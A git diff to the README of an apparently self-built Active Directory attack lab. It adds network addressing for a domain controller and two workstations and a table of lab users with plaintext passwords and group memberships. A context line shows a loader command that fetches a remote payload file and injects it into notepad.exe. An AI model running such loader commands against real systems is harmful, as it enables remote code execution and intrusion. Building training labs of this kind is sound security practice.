@@ -367,3 +367,64 @@ C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.ex
 ### Active Directory Network Diagram
 ![image](https://user-images.githubusercontent.com/107750005/220043885-bd4ab66c-f78f-4d74-8d63-76f1f958ff43.png)
 
+### Active Directory Network Addresses
+1. DC01
+    - Secure Network
+        - Static IPv4: `10.10.101.131`
+        - Subnet Mask: `255.255.255.0`
+        - Default Gateway: `10.10.101.1`
+        - Preferred DNS: `127.0.0.1`
+        - Alternate DNS: `8.8.8.8`
+
+2. WORKSTATION-01
+    - External Network
+        - Dynamic IPv4: `192.168.25.149` (DHCP will assign)
+        - Subnet Mask: `auto-assigned`
+        - Default Gateway: `auto-assigned`
+        - Preferred DNS: `auto-assigned`
+        - Alternate DNS: `auto-assigned`
+        
+    - Internal Network
+        - Static IPv4: `10.10.100.128`
+        - Subnet Mask: `255.255.255.0`
+        - Default Gateway: 
+        - Preferred DNS: `10.10.100.129`
+        - Alternate DNS: `8.8.8.8`
+        
+    - Secure Network
+        - Static IPv4: `10.10.101.129`
+        - Subnet Mask: `255.255.255.0`
+        - Default Gateway: `10.10.101.1`
+        - Preferred DNS: `10.10.101.131`
+        - Alternate DNS: `8.8.8.8`
+
+3. WORKSTATION-02
+    - Internal Network
+        - Static IPv4: `10.10.100.129`
+        - Subnet Mask: `255.255.255.0`
+        - Default Gateway: 
+        - Preferred DNS: `10.10.100.128`
+        - Alternate DNS: `8.8.8.8`
+        
+    - Secure Network
+        - Static IPv4: `10.10.101.132`
+        - Subnet Mask: `255.255.255.0`
+        - Default Gateway: `10.10.101.1`
+        - Preferred DNS: `10.10.101.131`
+        - Alternate DNS: `8.8.8.8`
+        
+### Active Directory Users and Computers
+
+| **First Name** | **Last Name** | **Username** | **Password**         | **Group** | **Involvement** |
+|----------------|---------------|--------------|----------------------|----------------------------------|---|
+| Aaron          | Adams         | a.adams      | `C0nc0Rd1776!`       | Senior Management, Domain Admins | * |
+| Jonathan       | Taylor        | j.taylor     | `Lexington1776!`     | IT Admins, Administrators |   |
+| Jillian        | Anthony       | j.anthony    | `H1dD3nV4ll3y!`      | Engineering |   |
+| Tabitha        | Carter        | t.carter     | `AhArGuY5Nm7U3!@`    | Engineering |   |
+| Megan          | Phillips      | m.phillips   | `L4k3LiV3L0ve!`      | Engineering, Group Policy Creator Owners |   |
+| Richard        | Smith         | r.smith      | `Baseball123!`       | Engineering |   |
+| Samantha       | Chisholm      | s.chisholm   | `FallOutBoy1!`       | Sales | * |
+| Margaret       | Seitz         | m.seitz      | `Phi11i35@44`        | Engineering | * |
+| Aaron          | Tarolli       | a.tarolli    | `Password123!`       | Sales |   |
+| Zane           | Dickens       | z.dickens    | `M0t0rH3Ad65^$#`     | Sales | * |
+
